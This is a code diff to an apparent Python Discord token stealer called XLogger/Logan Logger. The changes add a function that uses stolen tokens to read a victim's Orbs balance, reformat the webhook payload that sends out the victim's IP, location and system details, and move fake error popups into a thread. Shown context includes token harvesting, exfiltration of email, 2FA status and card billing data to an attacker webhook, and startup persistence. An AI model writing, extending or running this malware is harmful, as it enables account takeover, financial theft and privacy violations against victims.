@@ -57,7 +57,21 @@ def sysinfo(webhook):
         if r.status_code in [200, 201, 204]:
             print('successfully sent os info')            
         else:
-            payload = {"content":"||@everyone||","embeds":[{"color":3646683,"fields":[{"name":"🖥️ PC Name","value":f"`{pcname}`"},{"name":"🌐 IP Info","value":f"\n`IP Address: {ipadd}`\n`Hostname: {hostname}`\n`Location: {city}, {region}, {country}`\n`Coordinates: {loc}`\n`Organization: {org}`\n`Postal: {postal}`\n`Timezone: {timezone}`"},{"name":"🐏 RAM","value":f"`{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB`"},{"name":"💻 OS","value":f"`{plat}`"},{"name":"👤 User","value":f"`{username}`"}],"footer":{"text":"Logged by XLogger"}}],"username":"TS | System Info","attachments":[]}
+            payload = {
+                "content": "||@everyone||",
+                "embeds": [
+                    {
+                        "color": 3646683, 
+                        "fields": [
+                            {"name": "🖥️ PC Name", "value": f"`{pcname}`"},
+                            {"name": "🌐 IP Info", "value": f"\n`IP Address: {ipadd}`\n`Hostname: {hostname}`\n`Location: {city}, {region}, {country}`\n`Coordinates: {loc}`\n`Organization: {org}`\n`Postal: {postal}`\n`Timezone: {timezone}`"},
+                            {"name": "🐏 RAM", "value": f"`{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB`"},
+                            {"name": "💻 OS", "value": f"`{plat}`"},
+                            {"name": "👤 User", "value": f"`{username}`"}],
+                        "footer": {"text": "Logged by XLogger/Logan Logger https://github.com/xvhjs2/tknstealer-v2"}
+                    }
+                ],
+                "username": "TS | System Info"}
             r = requests.post(webhook, json=payload)
 
 def add_to_startup():
@@ -124,10 +138,42 @@ def sendwebhook(webhook, token, payload):
     else:
         print(f'failed to print tk to wbh {r.status_code} {r.text}')
 
+def get_orbs(token):
+    headers = {
+    "accept": "*/*",
+    "accept-language": "en-US",
+    "authorization": token,
+    "priority": "u=1, i",
+    "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": "\"Windows\"",
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "same-origin",
+    "x-debug-options": "bugReporterEnabled",
+    "x-discord-locale": "en-US",
+    "x-discord-timezone": "America/New_York",
+    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJwdGIiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC4xMTcyIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJoYXNfY2xpZW50X21vZHMiOmZhbHNlLCJjbGllbnRfbGF1bmNoX2lkIjoiNTRlOWU3OWMtYzkyYS00N2ZiLTk3MDEtNzgzODMxOTllN2UxIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgZGlzY29yZC8xLjAuMTE3MiBDaHJvbWUvMTM4LjAuNzIwNC4yNTEgRWxlY3Ryb24vMzcuNi4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIzNy42LjAiLCJvc19zZGtfdmVyc2lvbiI6IjE5MDQ1IiwiY2xpZW50X2J1aWxkX251bWJlciI6NDgyMjg1LCJuYXRpdmVfYnVpbGRfbnVtYmVyIjo3MzM5MSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwibGF1bmNoX3NpZ25hdHVyZSI6IjQzMGNlYmViLTM2M2UtNDdmNC05OTQ4LTVhMGE0ZWRkNDU1NCIsImNsaWVudF9oZWFydGJlYXRfc2Vzc2lvbl9pZCI6IjQ5Zjc0NzAyLTRjZWYtNDlhZi1hNWU0LThkMmUzMjRhNTNkNSIsImNsaWVudF9hcHBfc3RhdGUiOiJmb2N1c2VkIn0=",
+    "referrer": "https://ptb.discord.com/quest-home",
+    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.1172 Chrome/138.0.7204.251 Electron/37.6.0 Safari/537.36"
+  }
+
+    orb = requests.get(f'https://ptb.discord.com/api/v9/users/@me/virtual-currency/balance', headers=headers)
+
+    if orb.status_code == 200:
+        orbs = orb.json()
+        bal = orbs['balance']
+    
+        return str(bal)
+    else:
+        print(orb.status_code, orb.text, token)
+        return '0'
 def printtk(webhook, token):
     v = verify(token)
+    
     if v:
         userinfo = v
+        orbs = get_orbs(token)
         username = userinfo.get('username', "N/A")
         email = userinfo.get('email', "N/A")
         user_id = userinfo.get('id')
@@ -140,7 +186,7 @@ def printtk(webhook, token):
         pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}?size=1024" if avatar else "None"
         billing_fields = []
         cc_digits = {"visa": "4", "mastercard": "5", "amex": "3", "discover": "6"}
-
+            
         try:
             billing_req = requests.get(
                 'https://discord.com/api/v6/users/@me/billing/payment-sources',
@@ -235,9 +281,10 @@ def printtk(webhook, token):
                         {"name": "🔑 2FA", "value": f"`{mfa}`"},
                         {"name": "💔 Nitro", "value": f"`{nitro}`", "inline": True},
                         {"name": "🤓 Locale", "value": f"`{locale}`"},
+                        {"name": "🪙 Orbs", "value": f"`{orbs}`"},
                         *billing_fields
                     ],
-                    "footer": {"text": "Logged by XLogger"}
+                    "footer": {"text": "Logged by XLogger/Logan Logger https://github.com/xvhjs2/tknstealer-v2"}
                 }
             ],
             "username": "TS | Valid",
@@ -381,20 +428,22 @@ def stealtks():
     print(tokens)
     print(str(len(tokens)), 'tokens logged')
     return tokens
-    
+
+def errormsg():
+    if errtype.lower() == 'error':
+        ctypes.windll.user32.MessageBoxW(0, errmg if errmg else 'An unexpected error occurred. (0x8007000D).', "Critical Error", 16)
+    elif errtype.lower() == 'info':
+        ctypes.windll.user32.MessageBoxW(0, errmg if errmg else 'Program is about to install C++ Redistributable 2012.', "Info", 64)
+    elif errtype.lower() == 'warning':
+        ctypes.windll.user32.MessageBoxW(0, errmg if errmg else 'Administrator privaleges are required, however you can run this without it.', "Warning", 48)
 def main():
 
     if strtup:
         add_to_startup() #persistence (every time the victim turns on their computer the file will run)
         
-
     if errerror:
-        if errtype.lower() == 'error':
-            ctypes.windll.user32.MessageBoxW(0, errmg if errmg else 'An unexpected error occurred. (0x8007000D).', "Critical Error", 16)
-        elif errtype.lower() == 'info':
-            ctypes.windll.user32.MessageBoxW(0, errmg if errmg else 'Program is about to install C++ Redistributable 2012.', "Info", 64)
-        elif errtype.lower() == 'warning':
-            ctypes.windll.user32.MessageBoxW(0, errmg if errmg else 'Administrator privaleges are required, however you can run this without it.', "Warning", 48)
+        t = threading.Thread(target=errormsg, args=())
+        t.start()
 
 
     tks = stealtks()
@@ -407,7 +456,3 @@ def main():
         
 
 main()
-
-
-
-
